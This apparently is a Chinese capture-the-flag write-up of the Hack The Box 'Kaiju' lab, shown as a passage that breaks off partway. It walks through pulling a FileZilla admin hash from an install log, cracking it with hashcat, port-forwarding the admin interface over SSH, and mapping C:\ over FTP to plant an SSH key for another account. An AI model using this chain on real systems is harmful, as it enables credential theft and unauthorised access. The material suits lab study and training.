HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasAcd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasAgileVpn
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasAuto
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasGre
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Rasl2tp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasMan
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasPppoe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasSstp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\rdbss
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RDMANDK
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\rdpbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RDPDR
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RDPNP
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RDPUDD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RdpVideoMiniport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ReFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ReFSv1
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RemoteAccess
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RemoteRegistry
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RFCOMM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\rhproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RmSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RpcEptMapper
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RpcLocator
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RpcSs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RSoPProv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\rspndr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\s3cap
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sacdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sacsvr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SamSs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sbp2port
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SCardSvr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ScDeviceEnum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\scfilter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Schedule
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\scmbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SCPolicySvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sdbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SDFRd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sdstor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SecurityHealthService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SEMgrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SENS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Sense
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SensorDataService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SensorService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SensrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SerCx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SerCx2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Serenum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Serial
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sermouse
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SessionEnv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sfloppy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ShellHWDetection
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\shpamsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SiSRaid2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SiSRaid4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SmartSAMD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\smbdirect
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\smphost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SMSvcHost 4.0.0.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SNMPTRAP
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\spaceparser
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\spaceport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SpbCx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Spooler
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sppsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\srv2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\srvnet
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SSDPSRV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ssh-agent
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sshd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SstpSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\StateRepository
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\stexstor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\StiSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\storahci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\storflt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\stornvme
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\storqosflt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\StorSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\storufs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\storvsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\svsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\swenum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\swprv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SysMain
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SystemEventsBroker
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TabletInputService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\tapisrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip6
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TCPIP6TUNNEL
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\tcpipreg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TCPIPTUNNEL
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\tdx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\terminpt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TermService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Themes
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TieringEngineService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TimeBrokerSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TokenBroker
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TPM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TrkWks
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TrustedInstaller
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TSDDD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TsUsbFlt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\TsUsbGD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\tsusbhub
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\tunnel
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\tzautoupdate
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UALSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UASPStor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UcmCx0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UcmTcpciCx0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UcmUcsiAcpiClient
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UcmUcsiCx0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Ucx01000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UdeCx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\udfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UdkUserSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UdkUserSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UEFI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UevAgentDriver
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UevAgentService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Ufx01000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UfxChipidea
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ufxsynopsys
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UGatherer
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UGTHRSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\umbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UmPass
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UmRdpService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UnionFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UnistoreSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UnistoreSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\upnphost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UrsChipidea
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UrsCx01000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UrsSynopsys
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Usb4DeviceRouter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Usb4HostRouter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbaudio
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbaudio2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbccgp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbehci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbhub
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\USBHUB3
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbohci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbprint
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbser
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\USBSTOR
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\usbuhci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\USBXHCI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UserDataSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UserDataSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UserManager
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\UsoSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VaultSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vdrvroot
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vds
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VerifierExt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VGAuthService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vhdmp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vhf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VirtualRender
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vm3dmp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vm3dmp-debug
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vm3dmp-stats
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vm3dmp_loader
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vm3dservice
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VMBusHID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmgid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmhgfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmicguestinterface
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmicheartbeat
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmickvpexchange
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmicrdv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmicshutdown
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmictimesync
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmicvmsession
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmicvss
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VMMemCtl
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmmouse
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VMTools
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmusbmouse
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmvss
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmwefifw
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vmxnet3ndis6
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\volmgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\volmgrx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\volsnap
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\volume
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vpci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vsmraid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vsock
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VSS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VSTXRAID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\vwifibus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\W32Time
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WaaSMedicSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WacomPen
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WalletService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\wanarp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\wanarpv6
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WarpJITSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WbioSrvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\wcifs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Wcmsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WdBoot
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Wdf01000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WdFilter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WdiServiceHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WdiSystemHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WdmCompanionFilter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WdNisDrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WdNisSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Wecsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WEPHOSTSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\wercplsupport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WerSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WFPLWFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WiaRpc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WIMMount
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WinDefend
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Windows Workflow Foundation 4.0.0.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WindowsTrustedRT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WindowsTrustedRTProxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WinHttpAutoProxySvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WinMad
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Winmgmt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WinNat
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WinRM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Winsock
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WinSock2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WINUSB
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WinVerbs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\wisvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\wlidsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WmiAcpi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WmiApRpl
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\wmiApSrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WMPNetworkSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Wof
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\workerdd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WPDBusEnum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WpdUpFltr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WpnService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WpnUserService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WpnUserService_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ws2ifsl
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WSearch
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WSearchIdxPi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\wuauserv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WudfPf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WUDFRd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\xenbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\xenfilt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\xeniface
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\xenvbd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\xenvif
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\xmlprov
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\{2BE82B6F-393B-4D6B-9967-4FAC212BC577}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\{5B9BA140-AAC1-43E3-8FBA-1EA8175D6761}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\{9374E80C-5EC9-4C05-98BC-84FE759575C4}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\{93A7DAC6-DB30-420D-A57D-1F125BE8ECAE}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\{BCF70F82-3977-4A17-AF46-375D604F342C}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Enum

```

#### FileZillla服务
> 我们发现FileZillla服务运行在E盘并且是由sasrv200用户进行运行
>

```c
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\filezilla-server
```

```c
backup@BERSRV200 C:\Users\backup>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\filezilla-server

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\filezilla-server
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x2
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "E:\Program Files\FileZilla Server\filezilla-server.exe"
    DisplayName    REG_SZ    filezilla-server
    WOW64    REG_DWORD    0x14c
    ObjectName    REG_SZ    kaiju.vl\sasrv200
```

#### 磁盘查看
```c
backup@BERSRV200 C:\>fsutil fsinfo drives  

Drives: A:\ C:\ E:\ 
```

#### 切换E盘
```c
backup@BERSRV200 C:\>E: 

backup@BERSRV200 E:\>dir
 Volume in drive E is Data
 Volume Serial Number is 323F-CD35

 Directory of E:\

12/27/2023  03:15 AM    <DIR>          Private
12/27/2023  03:15 AM    <DIR>          Program Files
12/27/2023  03:15 AM    <DIR>          Public
               0 File(s)              0 bytes
               3 Dir(s)   2,451,832,832 bytes free
```

#### hash发现
> 在E:\Program Files\FileZilla Server\install.log 日志文件中我们发现了管理员的hash
>

```c
backup@BERSRV200 E:\Program Files\FileZilla Server>type install.log

...
Delete file: C:\Users\ADMINI~1\AppData\Local\Temp\1\nsxEDF4.tmp
Crypt output: [--admin.password@index=1 --admin.password.hash=mSbrgj1R6oqMMSk4Qk1TuYTchS5r8Yk3Y5vsBgf2tF8 --admin.password.salt=AdRNx7rAs1CEM23S5Zp7NyAQYHcuo2LuevU3pAXKB18 --admin.password.iterations=100000] 
=====================================
Take note of the FileZilla Server Administration Interface TLS fingerprints:
SHA256 certificate fingerprint: 72:30:ea:81:80:0f:33:99:cc:70:52:1e:7c:bc:6f:ba:2c:4d:4b:0d:6f:bc:fe:61:7e:e6:c1:06:38:d5:3d:9d

=====================================
```

```c
sha256:100000:AdRNx7rAs1CEM23S5Zp7NyAQYHcuo2LuevU3pAXKB18:mSbrgj1R6oqMMSk4Qk1TuYTchS5r8Yk3Y5vsBgf2tF8
```

#### hash破解
> 得到密码为kaiju123 接下来我们需要自行安装FileZilla服务来进行利用
>

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# hashcat -m 10900 sasrvhash ./pass 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

sha256:100000:AdRNx7rAs1CEM23S5Zp7NyAQYHcuo2LuevU3pAXKB18:mSbrgj1R6oqMMSk4Qk1TuYTchS5r8Yk3Y5vsBgf2tF8:kaiju123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:100000:AdRNx7rAs1CEM23S5Zp7NyAQYHcuo2LuevU3p...gf2tF8
Time.Started.....: Mon Mar 23 18:43:23 2026 (1 sec)
Time.Estimated...: Mon Mar 23 18:43:24 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (./pass)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      101 H/s (0.56ms) @ Accel:166 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7/7 (100.00%)
Rejected.........: 0/7 (0.00%)
Restore.Point....: 0/7 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:99000-99999
Candidate.Engine.: Device Generator
Candidates.#01...: backup -> firewall123
Hardware.Mon.#01.: Util: 32%

Started: Mon Mar 23 18:43:22 2026
Stopped: Mon Mar 23 18:43:25 2026
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# hashcat -m 10900 sasrvhash --show
sha256:100000:AdRNx7rAs1CEM23S5Zp7NyAQYHcuo2LuevU3pAXKB18:mSbrgj1R6oqMMSk4Qk1TuYTchS5r8Yk3Y5vsBgf2tF8:kaiju123
```

## FileZilla
### 查看版本
```c
backup@BERSRV200 C:\Users\backup>powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\FileZilla Server' | Select-Object DisplayVersion

DisplayVersion
--------------
1.8.0
```

### 下载安装
> [https://www.fileeagle.com/software/1788/FileZilla-Server/1.8.0](https://www.fileeagle.com/software/1788/FileZilla-Server/1.8.0)
>

```c
sudo apt install ./FileZilla_Server_1.8.0_x86_64-linux-gnu.deb
```

### 服务启动
```c
/opt/filezilla-server/bin/filezilla-server-gui
```

### 端口转发
> 根据 HackTricks，我们知道 FileZilla 的管理界面默认运行在 14147 端口上
>
> 现在我们只需要在攻击者主机上安装 Fiilezilla，并将内部端口转发到我们的服务器，这样我们就能访问 FileZilla 服务器接口 
>

```c
ssh -L 1337:localhost:14148 -N backup@10.13.38.41
```

### 远程连接
![](/image/hackthebox-prolabs/Kaiju-5.png)

### linux连接
![](/image/hackthebox-prolabs/Kaiju-6.png)

### linux设置(失败)
> 报错原因可能是因为靶机启动的是win服务，而我们是以linux服务连接导致路径不匹配
>

![](/image/hackthebox-prolabs/Kaiju-7.png)



### win连接
> 启动windows攻击机(推荐使用JiaoSuInfoSec的虚拟机)，下载并安装(下载链接与之前一致)
>
> 我们也能成功连接
>

![](/image/hackthebox-prolabs/Kaiju-8.png)

### win设置
> 我们添加一个用户heathcliff并赋予C：读写的权限，将C:\ 挂载到根目录中
>
> 当然我们也可以直接将backup用户的路径设置为C:\当中
>

![](/image/hackthebox-prolabs/Kaiju-9.png)

![](/image/hackthebox-prolabs/Kaiju-10.png)

## FTP
> 成功将C盘挂载到ftp的根目录中且我们具有修改写入权限
>
> 接下来我们将生成ssh密钥来进行登录svc服务账号
>

### 权限验证
![](/image/hackthebox-prolabs/Kaiju-11.png)

### 生成密钥
```c
ssh-keygen -t ed25519 -f ./id_sasrv
```

### 创建文件夹
```c
ftp> pwd
Remote directory: /Users/sasrv200
ftp> mkdir .ssh
257 "/Users/sasrv200/.ssh" created successfully.
```

### 更改名字
> SSH 守护进程（sshd）只读取 ~/.ssh/authorized_keys 这个固定文件名，不会读取 .pub 文件
